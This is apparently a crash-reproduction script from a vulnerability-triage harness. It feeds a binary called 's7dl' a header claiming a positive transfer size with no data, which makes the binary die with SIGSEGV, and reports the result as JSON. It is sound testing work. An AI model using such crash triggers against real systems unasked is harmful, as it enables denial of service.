#!/usr/bin/env python3
"""Reproduce an observable outcome for the `s7dl` target binary.

The binary accepts an 8-byte little-endian header (signed i32 block number,
signed i32 transfer size) followed by an arbitrary data buffer.  During
probing we observed that a header claiming a positive transfer size but with
an *empty* data buffer deterministically makes the binary terminate with
SIGSEGV after printing its status line (the strongest observable outcome),
while every other input shape is rejected cleanly with a ``... error:`` line.

This script constructs that trigger at runtime, writes it to a temporary
file, runs the binary exactly once, and reports a normalized JSON result.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def signal_name(signum: int) -> str:
    """Return the symbolic name for a signal number (e.g. SIGSEGV)."""
    try:
        return signal.Signals(signum).name
    except (ValueError, AttributeError):
        return "SIG%d" % signum


def build_trigger() -> bytes:
    """Construct the trigger input entirely at runtime.

    Header layout (8 bytes, little-endian):
        bytes 0..3: signed i32 "block number"
        bytes 4..7: signed i32 "transfer size"
    followed by the data buffer.

    A positive transfer size combined with an empty data buffer causes the
    binary to dereference a null/empty buffer during processing and die with
    SIGSEGV.  The values are fixed and deterministic.
    """
    block_num = 0
    transfer_size = 8
    header = struct.pack("<ii", block_num, transfer_size)
    data = b""
    return header + data


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(prog="poc.py")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="optional path to write the JSON result")
    parser.add_argument("--timeout", type=float, default=10.0, help="run timeout in seconds")
    args = parser.parse_args(argv)

    binary = os.path.abspath(args.binary)
    timeout = args.timeout

    payload = build_trigger()

    fd, input_path = tempfile.mkstemp(prefix="s7dl_input_", suffix=".bin")
    try:
        with os.fdopen(fd, "wb") as fh:
            fh.write(payload)

        command = [binary, input_path]

        start = time.monotonic()
        timed_out = False
        try:
            proc = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
            returncode = proc.returncode
            stdout = proc.stdout
            stderr = proc.stderr
        except subprocess.TimeoutExpired as exc:
            timed_out = True
            returncode = exc.returncode if exc.returncode is not None else -signal.SIGKILL
            stdout = exc.stdout if isinstance(exc.stdout, (bytes, bytearray)) else (exc.stdout or b"")
            stderr = exc.stderr if isinstance(exc.stderr, (bytes, bytearray)) else (exc.stderr or b"")
        runtime_ms = int(round((time.monotonic() - start) * 1000))

        stdout_text = stdout.decode("utf-8", errors="replace")
        stderr_text = stderr.decode("utf-8", errors="replace")

        if returncode < 0:
            sig = -returncode
            name = signal_name(sig)
            observable_value = "crash:%s" % name
            signal_field = name
        else:
            signal_field = None
            observable_value = "exit:%d" % returncode

        result = {
            "binary": binary,
            "command": [binary, input_path],
            "returncode": returncode,
            "signal": signal_field,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout_text,
            "stderr": stderr_text,
            "observable": {"kind": "custom", "value": observable_value, "path": None},
            "error": None,
        }

        json_text = json.dumps(result)
        sys.stdout.write(json_text + "\n")
        sys.stdout.flush()

        if args.json_out:
            with open(args.json_out, "w") as out_fh:
                out_fh.write(json_text + "\n")

        return 0
    finally:
        try:
            os.unlink(input_path)
        except OSError:
            pass


if __name__ == "__main__":
    sys.exit(main())
